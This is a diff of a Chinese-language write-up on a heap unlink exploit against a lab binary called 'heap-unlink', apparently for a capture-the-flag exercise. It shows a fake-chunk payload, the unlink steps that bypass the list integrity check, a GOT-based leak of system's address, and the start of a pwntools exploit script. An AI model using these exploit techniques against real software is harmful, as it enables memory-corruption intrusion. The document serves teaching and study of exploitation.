@@ -125,7 +125,7 @@ Delete 函数分析
 	    write(1, "Delete chunk error!\n", 0x14u);
 	}
 
-
+`free后指针未置零`
 
 Print 函数分析
 
@@ -294,7 +294,8 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 
 
 #### 新建chunk 0 1 2 3
-栈空间如图：
+
+栈空间如图()：
 
 ![pic1]
 
@@ -314,16 +315,15 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 	+-----------+---------+----+----+----+----+----+------+------+----+----+------+
 我们在malloc返回的ptr0（chunk 0）开始地方构造的数据：
 
-**start = &buf**
 
-	p32(0) + p32(81) + p32(start-12) + p32(start-8) + "A"*(80-4*4) + p32(80) + p32(88)
+	p32(0) + p32(81) + p32(&chunk0-12) + p32(&chunk0-8) + "A"*(80-4*4) + p32(80) + p32(88)
 
-这样的话将chunk 0的mem空间伪造成一个fake_chunk，其中fake_fd=p32(start-12) ， fake_bk=p32(start-8) 这样做的话执行unlink操作时
+这样的话将chunk 0的mem空间伪造成一个fake_chunk，其中fake_fd=p32(&chunk0-12) ， fake_bk=p32(&chunk0-8) 这样做的话执行unlink操作时
 
-	FD=P->fd = &buf-12 ，
-	BK=P->bk = &buf-8 ，
-	FD->bk ，即 *(start-12+12) = *(&buf) = buf[0] = chunk 0 = p 
-	BK->fd ，即*(start-8+8) = *(&buf) = buf[0] = chunk 0 = p
+	FD=P->fd = &chunk0-12 ，
+	BK=P->bk = &chunk0-8 ，
+	FD->bk ，即 *(&chunk0-12+12) = *(&chunk0) = buf[0] = chunk 0 = p 
+	BK->fd ，即*(&chunk0-8+8) = *(&chunk0) = buf[0] = chunk 0 = p
 
 这样就绕过了双向链表检查。
 
@@ -338,20 +338,20 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 
 由于在 chunk 1 前面构造了一个伪造的空闲内存块，当free(chunk[1])时，就会对伪造的空闲内存块进行unlink操作：
 
-	F = p -> fd;    #F = &buf - 12
-	B = p -> bk;    #B = &buf- 8
+	F = p -> fd;    #F = &chunk0 - 12
+	B = p -> bk;    #B = &chunk0- 8
 	if (F -> bk == p && B -> fd == p){
-	  F -> bk = B;    #即buf[0] = B = &buf - 8
-	  B -> fd = F;    #即buf[0] = F = &buf -12
+	  F -> bk = B;    #即buf[0] = B = &chunk0 - 8
+	  B -> fd = F;    #即buf[0] = F = &chunk0 -12
 	}
 
-从上可知，unlink后，buf[0]存的不再是chunk 0 的起始地址了，而是&buf - 12。此时我们只关心buf数组的内存，其布局如下：
+从上可知，unlink后，buf[0]存的不再是chunk 0 的起始地址了，而是&chunk0 - 12 即 &buf-12。此时我们只关心buf数组的内存，其布局如下：
 
 ![pic2]
 
 #### Leaking
 
-这样我们可以通过set_chunk（0，data = "A" * 12 + p32(start-12) + p32(addr)）保持chunk 0指向&buf-12，并覆盖chunk 1地址为addr,leak出system地址
+这样我们可以通过set_chunk（0，data = "A" * 12 + p32(&buf-12) + p32(addr)）保持chunk 0指向&buf-12，并覆盖chunk 1地址为addr,leak出system地址
 
 万事俱备，只欠东风~
 
@@ -365,7 +365,7 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 	
 	p = process("./heap-unlink")
 	
-	start = 0x8049d60 #start=&buf
+	start = 0x8049d60 #start=&chunk0
 	free_got = 0x8049ce8
 	
 	flag = 0
